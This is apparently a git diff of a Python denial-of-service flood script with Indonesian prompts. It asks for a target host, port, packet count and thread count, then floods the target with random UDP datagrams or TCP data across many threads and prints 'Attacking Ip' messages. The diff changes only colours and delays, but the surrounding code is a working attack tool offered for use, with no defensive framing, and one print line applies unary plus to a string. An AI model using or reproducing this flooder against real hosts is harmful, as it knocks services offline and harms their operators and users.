@@ -60,24 +60,24 @@ print("""\033[31m
 """)
 time.sleep(2)
 
-print("\033[31m━━━ Kenal Gzaaxyz? (y/n)")
+print("\033[31m ━━━\033[33m Kenal Gzaaxyz? (y/n)")
 choice = str(input("┗━━━━━━\033[32m>\033[0m "))
-time.sleep(1)
-print("\033[31m━━━ (UDP/TCP)")
+time.sleep(0.5)
+print("\033[31m ━━━\033[33m (UDP/TCP)")
 choice = str(input("┗━━━━━━\033[32m>\033[0m "))
-time.sleep(1)
-print("\033[31m━━━ Host/IP")
+time.sleep(0.5)
+print("\033[31m ━━━\033[33m Host/IP")
 ip = str(input("┗━━━━━━\033[32m>\033[0m "))
-time.sleep(1)
-print("\033[31m━━━ Port")
+time.sleep(0.5)
+print("\033[31m ━━━\033[33m Port")
 port = int(input("┗━━━━━━\033[32m>\033[0m "))
-time.sleep(1)
-print("\033[31m━━━ Pakets")	
-print("\033[31m━━━ Min Pakets 100")
+time.sleep(0.5)
+print("\033[31m ━━━\033[33m Pakets")	
+print("\033[31m ━━━\033[33m Min Pakets 100")
 times = int(input("┗━━━━━━\033[32m>\033[0m "))
-time.sleep(1)
-print("\033[31m━━━ Threads")
-print("\033[31m━━━ Min Threads 100")
+time.sleep(0.5)
+print("\033[31m ━━━\033[33m Threads")
+print("\033[31m ━━━\033[33m Min Threads 100")
 threads = int(input("┗━━━━━━\033[32m>\033[0m "))
 def udp():
 	data = random._urandom(900)
@@ -87,7 +87,7 @@ def udp():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(+"\033[91m Attacking Ip %s \033[91m Port %s"%(ip,port))
+			print(+"\033[91m Attacking Ip %s \033[93m Port %s"%(ip,port))
 		except:
 			print("\033[91m Server %s Has Been Maintenance %s"%(ip,port))
 def tcp():
@@ -101,7 +101,7 @@ def tcp():
 				s.send(data)
 		except:
 			s.close()
-			print("\033[91m Attacking Ip %s Port %s"%(ip,port))
+			print("\033[91m Attacking Ip %s \033[95m Port %s"%(ip,port))
 
 for y in range(threads):
     if choice == 'UDP':
